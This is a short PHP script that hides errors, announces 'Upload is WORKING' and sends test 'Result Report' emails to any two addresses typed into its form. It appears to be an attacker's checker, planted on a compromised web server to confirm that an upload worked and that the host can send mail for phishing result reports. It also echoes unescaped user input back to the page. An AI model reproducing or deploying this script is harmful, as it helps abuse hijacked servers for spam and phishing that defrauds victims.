<?php
ini_set('error_reporting', 0);
?>
Upload is <b><span style="color: green">WORKING</span></b><br>
Check Mailling ..<br>
<form method="post">
    <input type="text" name="email1" value="" required >
    <input type="text" name="email2" value="" required >
    <input type="submit" value="Send test >>">
</form>
<br>
<?php
if (!empty($_POST['email1']) && !empty($_POST['email2'])){
    $xx = mt_rand();
    if (mail($_POST['email1'],"Result Report Test -".$xx,"WORKING !") && mail($_POST['email2'],"Result Report Test -".$xx,"WORKING !")){
        print "<b>send an report to[".$_POST['email1']."] and [".$_POST['email2']."] - $xx</b>";
    } else {
        print "<b>failed to send an report to[".$_POST['email1']."] and/or [".$_POST['email2']."]</b>";
    }
}
?>